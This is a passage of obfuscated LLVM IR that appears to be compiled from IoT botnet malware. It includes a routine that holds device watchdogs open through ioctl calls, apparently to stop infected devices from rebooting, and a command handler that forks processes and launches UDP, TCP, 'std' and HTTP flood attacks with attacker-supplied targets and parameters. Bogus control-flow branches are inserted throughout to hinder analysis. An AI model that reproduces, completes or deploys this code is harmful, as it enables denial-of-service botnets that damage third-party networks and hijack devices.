  call void @llvm.memset.p0i8.i64(i8* %12, i8 0, i64 28, i32 16, i1 false)
  store i32 1, i32* %10, align 4
  store i32 0, i32* %11, align 4
  call void @table_unlock_val(i8 zeroext 1)
  call void @table_unlock_val(i8 zeroext 2)
  call void @table_unlock_val(i8 zeroext 3)
  call void @table_unlock_val(i8 zeroext 4)
  call void @table_unlock_val(i8 zeroext 5)
  call void @table_unlock_val(i8 zeroext 6)
  call void @table_unlock_val(i8 zeroext 7)
  %13 = call i8* @table_retrieve_val(i32 1, i32* null)
  %14 = call i32 (i8*, i32, ...) @open(i8* %13, i32 2)
  %15 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 0
  store i32 %14, i32* %15, align 16
  %16 = icmp ne i32 %14, -1
  %17 = load i32, i32* @x.39
  %18 = load i32, i32* @y.40
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %16, label %87, label %25

; <label>:25:                                     ; preds = %originalBBpart2
  %26 = load i32, i32* @x.39
  %27 = load i32, i32* @y.40
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = call i8* @table_retrieve_val(i32 2, i32* null)
  %35 = call i32 (i8*, i32, ...) @open(i8* %34, i32 2)
  %36 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 1
  store i32 %35, i32* %36, align 4
  %37 = icmp ne i32 %35, -1
  %38 = load i32, i32* @x.39
  %39 = load i32, i32* @y.40
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %37, label %87, label %46

; <label>:46:                                     ; preds = %originalBBpart24
  %47 = load i32, i32* @x.39
  %48 = load i32, i32* @y.40
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %46
  %55 = call i8* @table_retrieve_val(i32 3, i32* null)
  %56 = call i32 (i8*, i32, ...) @open(i8* %55, i32 2)
  %57 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 2
  store i32 %56, i32* %57, align 8
  %58 = icmp ne i32 %56, -1
  %59 = load i32, i32* @x.39
  %60 = load i32, i32* @y.40
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %58, label %87, label %67

; <label>:67:                                     ; preds = %originalBBpart28
  %68 = call i8* @table_retrieve_val(i32 4, i32* null)
  %69 = call i32 (i8*, i32, ...) @open(i8* %68, i32 2)
  %70 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 3
  store i32 %69, i32* %70, align 4
  %71 = icmp ne i32 %69, -1
  br i1 %71, label %87, label %72

; <label>:72:                                     ; preds = %67
  %73 = call i8* @table_retrieve_val(i32 5, i32* null)
  %74 = call i32 (i8*, i32, ...) @open(i8* %73, i32 2)
  %75 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 4
  store i32 %74, i32* %75, align 16
  %76 = icmp ne i32 %74, -1
  br i1 %76, label %87, label %77

; <label>:77:                                     ; preds = %72
  %78 = call i8* @table_retrieve_val(i32 6, i32* null)
  %79 = call i32 (i8*, i32, ...) @open(i8* %78, i32 2)
  %80 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 5
  store i32 %79, i32* %80, align 4
  %81 = icmp ne i32 %79, -1
  br i1 %81, label %87, label %82

; <label>:82:                                     ; preds = %77
  %83 = call i8* @table_retrieve_val(i32 7, i32* null)
  %84 = call i32 (i8*, i32, ...) @open(i8* %83, i32 2)
  %85 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 6
  store i32 %84, i32* %85, align 8
  %86 = icmp ne i32 %84, -1
  br i1 %86, label %87, label %109

; <label>:87:                                     ; preds = %82, %77, %72, %67, %originalBBpart28, %originalBBpart24, %originalBBpart2
  store i32 1, i32* %11, align 4
  %88 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 0
  %89 = load i32, i32* %88, align 16
  %90 = call i32 (i32, i64, ...) @ioctl(i32 %89, i64 2147768068, i32* %10) #6
  %91 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 1
  %92 = load i32, i32* %91, align 4
  %93 = call i32 (i32, i64, ...) @ioctl(i32 %92, i64 2147768068, i32* %10) #6
  %94 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 2
  %95 = load i32, i32* %94, align 8
  %96 = call i32 (i32, i64, ...) @ioctl(i32 %95, i64 2147768068, i32* %10) #6
  %97 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 3
  %98 = load i32, i32* %97, align 4
  %99 = call i32 (i32, i64, ...) @ioctl(i32 %98, i64 2147768068, i32* %10) #6
  %100 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 4
  %101 = load i32, i32* %100, align 16
  %102 = call i32 (i32, i64, ...) @ioctl(i32 %101, i64 2147768068, i32* %10) #6
  %103 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 5
  %104 = load i32, i32* %103, align 4
  %105 = call i32 (i32, i64, ...) @ioctl(i32 %104, i64 2147768068, i32* %10) #6
  %106 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 6
  %107 = load i32, i32* %106, align 8
  %108 = call i32 (i32, i64, ...) @ioctl(i32 %107, i64 2147768068, i32* %10) #6
  br label %109

; <label>:109:                                    ; preds = %87, %82
  %110 = load i32, i32* %11, align 4
  %111 = icmp ne i32 %110, 0
  br i1 %111, label %112, label %152

; <label>:112:                                    ; preds = %109
  br label %113

; <label>:113:                                    ; preds = %originalBBpart212, %112
  %114 = load i32, i32* @x.39
  %115 = load i32, i32* @y.40
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %113
  %122 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 0
  %123 = load i32, i32* %122, align 16
  %124 = call i32 (i32, i64, ...) @ioctl(i32 %123, i64 2147768069, i32 0) #6
  %125 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 1
  %126 = load i32, i32* %125, align 4
  %127 = call i32 (i32, i64, ...) @ioctl(i32 %126, i64 2147768069, i32 0) #6
  %128 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 2
  %129 = load i32, i32* %128, align 8
  %130 = call i32 (i32, i64, ...) @ioctl(i32 %129, i64 2147768069, i32 0) #6
  %131 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 3
  %132 = load i32, i32* %131, align 4
  %133 = call i32 (i32, i64, ...) @ioctl(i32 %132, i64 2147768069, i32 0) #6
  %134 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 4
  %135 = load i32, i32* %134, align 16
  %136 = call i32 (i32, i64, ...) @ioctl(i32 %135, i64 2147768069, i32 0) #6
  %137 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 5
  %138 = load i32, i32* %137, align 4
  %139 = call i32 (i32, i64, ...) @ioctl(i32 %138, i64 2147768069, i32 0) #6
  %140 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 6
  %141 = load i32, i32* %140, align 8
  %142 = call i32 (i32, i64, ...) @ioctl(i32 %141, i64 2147768069, i32 0) #6
  %143 = call i32 @sleep(i32 3)
  %144 = load i32, i32* @x.39
  %145 = load i32, i32* @y.40
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %113

; <label>:152:                                    ; preds = %109
  call void @table_lock_val(i8 zeroext 1)
  call void @table_lock_val(i8 zeroext 2)
  call void @table_lock_val(i8 zeroext 3)
  call void @table_lock_val(i8 zeroext 4)
  call void @table_lock_val(i8 zeroext 5)
  call void @table_lock_val(i8 zeroext 6)
  call void @table_lock_val(i8 zeroext 7)
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %153 = alloca [7 x i32], align 16
  %154 = alloca i32, align 4
  %155 = alloca i32, align 4
  %156 = bitcast [7 x i32]* %153 to i8*
  call void @llvm.memset.p0i8.i64(i8* %156, i8 0, i64 28, i32 16, i1 false)
  store i32 1, i32* %154, align 4
  store i32 0, i32* %155, align 4
  call void @table_unlock_val(i8 zeroext 1)
  call void @table_unlock_val(i8 zeroext 2)
  call void @table_unlock_val(i8 zeroext 3)
  call void @table_unlock_val(i8 zeroext 4)
  call void @table_unlock_val(i8 zeroext 5)
  call void @table_unlock_val(i8 zeroext 6)
  call void @table_unlock_val(i8 zeroext 7)
  %157 = call i8* @table_retrieve_val(i32 1, i32* null)
  %158 = call i32 (i8*, i32, ...) @open(i8* %157, i32 2)
  %159 = getelementptr inbounds [7 x i32], [7 x i32]* %153, i64 0, i64 0
  store i32 %158, i32* %159, align 16
  %160 = icmp ne i32 %158, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %161 = call i8* @table_retrieve_val(i32 2, i32* null)
  %162 = call i32 (i8*, i32, ...) @open(i8* %161, i32 2)
  %163 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 1
  store i32 %162, i32* %163, align 4
  %164 = icmp ne i32 %162, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %46
  %165 = call i8* @table_retrieve_val(i32 3, i32* null)
  %166 = call i32 (i8*, i32, ...) @open(i8* %165, i32 2)
  %167 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 2
  store i32 %166, i32* %167, align 8
  %168 = icmp ne i32 %166, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %113
  %169 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 0
  %170 = load i32, i32* %169, align 16
  %171 = call i32 (i32, i64, ...) @ioctl(i32 %170, i64 2147768069, i32 0) #6
  %172 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 1
  %173 = load i32, i32* %172, align 4
  %174 = call i32 (i32, i64, ...) @ioctl(i32 %173, i64 2147768069, i32 0) #6
  %175 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 2
  %176 = load i32, i32* %175, align 8
  %177 = call i32 (i32, i64, ...) @ioctl(i32 %176, i64 2147768069, i32 0) #6
  %178 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 3
  %179 = load i32, i32* %178, align 4
  %180 = call i32 (i32, i64, ...) @ioctl(i32 %179, i64 2147768069, i32 0) #6
  %181 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 4
  %182 = load i32, i32* %181, align 16
  %183 = call i32 (i32, i64, ...) @ioctl(i32 %182, i64 2147768069, i32 0) #6
  %184 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 5
  %185 = load i32, i32* %184, align 4
  %186 = call i32 (i32, i64, ...) @ioctl(i32 %185, i64 2147768069, i32 0) #6
  %187 = getelementptr inbounds [7 x i32], [7 x i32]* %9, i64 0, i64 6
  %188 = load i32, i32* %187, align 8
  %189 = call i32 (i32, i64, ...) @ioctl(i32 %188, i64 2147768069, i32 0) #6
  %190 = call i32 @sleep(i32 3)
  br label %originalBB10
}

declare i32 @open(i8*, i32, ...) #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #2

declare i32 @sleep(i32) #5

; Function Attrs: noinline nounwind uwtable
define void @proc_cmd(i32, i8**) #0 {
  %3 = load i32, i32* @x.41
  %4 = load i32, i32* @y.42
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  store i32 %0, i32* %11, align 4
  store i8** %1, i8*** %12, align 8
  %13 = load i8**, i8*** %12, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 0
  %15 = load i8*, i8** %14, align 8
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.56, i32 0, i32 0)) #10
  %17 = icmp ne i8* %16, null
  %18 = load i32, i32* @x.41
  %19 = load i32, i32* @y.42
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %17, label %44, label %26

; <label>:26:                                     ; preds = %originalBBpart2
  %27 = load i8**, i8*** %12, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = call i8* @strstr(i8* %29, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0)) #10
  %31 = icmp ne i8* %30, null
  br i1 %31, label %44, label %32

; <label>:32:                                     ; preds = %26
  %33 = load i8**, i8*** %12, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 0
  %35 = load i8*, i8** %34, align 8
  %36 = call i8* @strstr(i8* %35, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.58, i32 0, i32 0)) #10
  %37 = icmp ne i8* %36, null
  br i1 %37, label %44, label %38

; <label>:38:                                     ; preds = %32
  %39 = load i8**, i8*** %12, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 0
  %41 = load i8*, i8** %40, align 8
  %42 = call i8* @strstr(i8* %41, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.59, i32 0, i32 0)) #10
  %43 = icmp ne i8* %42, null
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %38, %32, %26, %originalBBpart2
  call void @stop_attack()
  br label %45

; <label>:45:                                     ; preds = %44, %38
  %46 = load i8**, i8*** %12, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 0
  %48 = load i8*, i8** %47, align 8
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.60, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %57, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i8**, i8*** %12, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 0
  %54 = load i8*, i8** %53, align 8
  %55 = call i8* @strstr(i8* %54, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.61, i32 0, i32 0)) #10
  %56 = icmp ne i8* %55, null
  br i1 %56, label %57, label %100

; <label>:57:                                     ; preds = %51, %45
  %58 = load i32, i32* %11, align 4
  %59 = icmp slt i32 %58, 5
  br i1 %59, label %63, label %60

; <label>:60:                                     ; preds = %57
  %61 = load i32, i32* %11, align 4
  %62 = icmp sgt i32 %61, 5
  br i1 %62, label %63, label %64

; <label>:63:                                     ; preds = %60, %57
  br label %291

; <label>:64:                                     ; preds = %60
  %65 = call i32 @listFork()
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %67, label %84

; <label>:67:                                     ; preds = %64
  %68 = load i32, i32* @x.41
  %69 = load i32, i32* @y.42
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %67
  %76 = load i32, i32* @x.41
  %77 = load i32, i32* @y.42
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %291

; <label>:84:                                     ; preds = %64
  %85 = load i8**, i8*** %12, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 1
  %87 = load i8*, i8** %86, align 8
  %88 = load i8**, i8*** %12, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 2
  %90 = load i8*, i8** %89, align 8
  %91 = call i32 @atoi(i8* %90) #10
  %92 = load i8**, i8*** %12, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 3
  %94 = load i8*, i8** %93, align 8
  %95 = call i32 @atoi(i8* %94) #10
  %96 = load i8**, i8*** %12, align 8
  %97 = getelementptr inbounds i8*, i8** %96, i64 4
  %98 = load i8*, i8** %97, align 8
  %99 = call i32 @atoi(i8* %98) #10
  call void @udpflood(i8* %87, i32 %91, i32 %95, i32 %99)
  br label %100

; <label>:100:                                    ; preds = %84, %51
  %101 = load i8**, i8*** %12, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 0
  %103 = load i8*, i8** %102, align 8
  %104 = call i8* @strstr(i8* %103, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.62, i32 0, i32 0)) #10
  %105 = icmp ne i8* %104, null
  br i1 %105, label %112, label %106

; <label>:106:                                    ; preds = %100
  %107 = load i8**, i8*** %12, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 0
  %109 = load i8*, i8** %108, align 8
  %110 = call i8* @strstr(i8* %109, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0)) #10
  %111 = icmp ne i8* %110, null
  br i1 %111, label %112, label %174

; <label>:112:                                    ; preds = %106, %100
  %113 = load i32, i32* %11, align 4
  %114 = icmp slt i32 %113, 6
  br i1 %114, label %134, label %115

; <label>:115:                                    ; preds = %112
  %116 = load i32, i32* @x.41
  %117 = load i32, i32* @y.42
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %115
  %124 = load i32, i32* %11, align 4
  %125 = icmp sgt i32 %124, 6
  %126 = load i32, i32* @x.41
  %127 = load i32, i32* @y.42
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %125, label %134, label %135

; <label>:134:                                    ; preds = %originalBBpart28, %112
  br label %291

; <label>:135:                                    ; preds = %originalBBpart28
  %136 = load i32, i32* @x.41
  %137 = load i32, i32* @y.42
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %135
  %144 = call i32 @listFork()
  %145 = icmp ne i32 %144, 0
  %146 = load i32, i32* @x.41
  %147 = load i32, i32* @y.42
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %145, label %154, label %155

; <label>:154:                                    ; preds = %originalBBpart212
  br label %291

; <label>:155:                                    ; preds = %originalBBpart212
  %156 = load i8**, i8*** %12, align 8
  %157 = getelementptr inbounds i8*, i8** %156, i64 1
  %158 = load i8*, i8** %157, align 8
  %159 = load i8**, i8*** %12, align 8
  %160 = getelementptr inbounds i8*, i8** %159, i64 2
  %161 = load i8*, i8** %160, align 8
  %162 = call i32 @atoi(i8* %161) #10
  %163 = load i8**, i8*** %12, align 8
  %164 = getelementptr inbounds i8*, i8** %163, i64 3
  %165 = load i8*, i8** %164, align 8
  %166 = call i32 @atoi(i8* %165) #10
  %167 = load i8**, i8*** %12, align 8
  %168 = getelementptr inbounds i8*, i8** %167, i64 4
  %169 = load i8*, i8** %168, align 8
  %170 = call i32 @atoi(i8* %169) #10
  %171 = load i8**, i8*** %12, align 8
  %172 = getelementptr inbounds i8*, i8** %171, i64 5
  %173 = load i8*, i8** %172, align 8
  call void @tcpflood(i8* %158, i32 %162, i32 %166, i32 %170, i8* %173)
  br label %174

; <label>:174:                                    ; preds = %155, %106
  %175 = load i8**, i8*** %12, align 8
  %176 = getelementptr inbounds i8*, i8** %175, i64 0
  %177 = load i8*, i8** %176, align 8
  %178 = call i8* @strstr(i8* %177, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0)) #10
  %179 = icmp ne i8* %178, null
  br i1 %179, label %186, label %180

; <label>:180:                                    ; preds = %174
  %181 = load i8**, i8*** %12, align 8
  %182 = getelementptr inbounds i8*, i8** %181, i64 0
  %183 = load i8*, i8** %182, align 8
  %184 = call i8* @strstr(i8* %183, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0)) #10
  %185 = icmp ne i8* %184, null
  br i1 %185, label %186, label %229

; <label>:186:                                    ; preds = %180, %174
  %187 = load i32, i32* %11, align 4
  %188 = icmp slt i32 %187, 5
  br i1 %188, label %192, label %189

; <label>:189:                                    ; preds = %186
  %190 = load i32, i32* %11, align 4
  %191 = icmp sgt i32 %190, 5
  br i1 %191, label %192, label %209

; <label>:192:                                    ; preds = %189, %186
  %193 = load i32, i32* @x.41
  %194 = load i32, i32* @y.42
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %192
  %201 = load i32, i32* @x.41
  %202 = load i32, i32* @y.42
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %291

; <label>:209:                                    ; preds = %189
  %210 = call i32 @listFork()
  %211 = icmp ne i32 %210, 0
  br i1 %211, label %212, label %213

; <label>:212:                                    ; preds = %209
  br label %291

; <label>:213:                                    ; preds = %209
  %214 = load i8**, i8*** %12, align 8
  %215 = getelementptr inbounds i8*, i8** %214, i64 1
  %216 = load i8*, i8** %215, align 8
  %217 = load i8**, i8*** %12, align 8
  %218 = getelementptr inbounds i8*, i8** %217, i64 2
  %219 = load i8*, i8** %218, align 8
  %220 = call i32 @atoi(i8* %219) #10
  %221 = load i8**, i8*** %12, align 8
  %222 = getelementptr inbounds i8*, i8** %221, i64 3
  %223 = load i8*, i8** %222, align 8
  %224 = call i32 @atoi(i8* %223) #10
  %225 = load i8**, i8*** %12, align 8
  %226 = getelementptr inbounds i8*, i8** %225, i64 4
  %227 = load i8*, i8** %226, align 8
  %228 = call i32 @atoi(i8* %227) #10
  call void @stdflood(i8* %216, i32 %220, i32 %224, i32 %228)
  br label %229

; <label>:229:                                    ; preds = %213, %180
  %230 = load i8**, i8*** %12, align 8
  %231 = getelementptr inbounds i8*, i8** %230, i64 0
  %232 = load i8*, i8** %231, align 8
  %233 = call i8* @strstr(i8* %232, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.66, i32 0, i32 0)) #10
  %234 = icmp ne i8* %233, null
  br i1 %234, label %241, label %235

; <label>:235:                                    ; preds = %229
  %236 = load i8**, i8*** %12, align 8
  %237 = getelementptr inbounds i8*, i8** %236, i64 0
  %238 = load i8*, i8** %237, align 8
  %239 = call i8* @strstr(i8* %238, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i32 0, i32 0)) #10
  %240 = icmp ne i8* %239, null
  br i1 %240, label %241, label %291

; <label>:241:                                    ; preds = %235, %229
  %242 = load i32, i32* @x.41
  %243 = load i32, i32* @y.42
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %241
  %250 = load i32, i32* %11, align 4
  %251 = icmp slt i32 %250, 7
  %252 = load i32, i32* @x.41
  %253 = load i32, i32* @y.42
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %251, label %263, label %260

; <label>:260:                                    ; preds = %originalBBpart220
  %261 = load i32, i32* %11, align 4
  %262 = icmp sgt i32 %261, 7
  br i1 %262, label %263, label %264

; <label>:263:                                    ; preds = %260, %originalBBpart220
  br label %291

; <label>:264:                                    ; preds = %260
  %265 = call i32 @listFork()
  %266 = icmp ne i32 %265, 0
  br i1 %266, label %267, label %268

; <label>:267:                                    ; preds = %264
  br label %291

; <label>:268:                                    ; preds = %264
  %269 = load i8**, i8*** %12, align 8
  %270 = getelementptr inbounds i8*, i8** %269, i64 1
  %271 = load i8*, i8** %270, align 8
  %272 = load i8**, i8*** %12, align 8
  %273 = getelementptr inbounds i8*, i8** %272, i64 2
  %274 = load i8*, i8** %273, align 8
  %275 = load i8**, i8*** %12, align 8
  %276 = getelementptr inbounds i8*, i8** %275, i64 3
  %277 = load i8*, i8** %276, align 8
  %278 = call i32 @atoi(i8* %277) #10
  %279 = trunc i32 %278 to i16
  %280 = load i8**, i8*** %12, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 4
  %282 = load i8*, i8** %281, align 8
  %283 = load i8**, i8*** %12, align 8
  %284 = getelementptr inbounds i8*, i8** %283, i64 5
  %285 = load i8*, i8** %284, align 8
  %286 = call i32 @atoi(i8* %285) #10
  %287 = load i8**, i8*** %12, align 8
  %288 = getelementptr inbounds i8*, i8** %287, i64 6
  %289 = load i8*, i8** %288, align 8
  %290 = call i32 @atoi(i8* %289) #10
  call void @httpflood(i8* %271, i8* %274, i16 zeroext %279, i8* %282, i32 %286, i32 %290)
  br label %291

; <label>:291:                                    ; preds = %268, %267, %263, %235, %212, %originalBBpart216, %154, %134, %originalBBpart24, %63
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %292 = alloca i32, align 4
  %293 = alloca i8**, align 8
  store i32 %0, i32* %292, align 4
  store i8** %1, i8*** %293, align 8
  %294 = load i8**, i8*** %293, align 8
  %295 = getelementptr inbounds i8*, i8** %294, i64 0
  %296 = load i8*, i8** %295, align 8
  %297 = call i8* @strstr(i8* %296, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.56, i32 0, i32 0)) #10
  %298 = icmp ne i8* %297, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %67
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %115
  %299 = load i32, i32* %11, align 4
  %300 = icmp sgt i32 %299, 6
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %135
  %301 = call i32 @listFork()
  %302 = icmp ne i32 %301, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %192
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %241
  %303 = load i32, i32* %11, align 4
  %304 = icmp slt i32 %303, 7
  br label %originalBB18
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @parse_buffer(i8*) #0 {
  %2 = load i32, i32* @x.43
  %3 = load i32, i32* @y.44
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
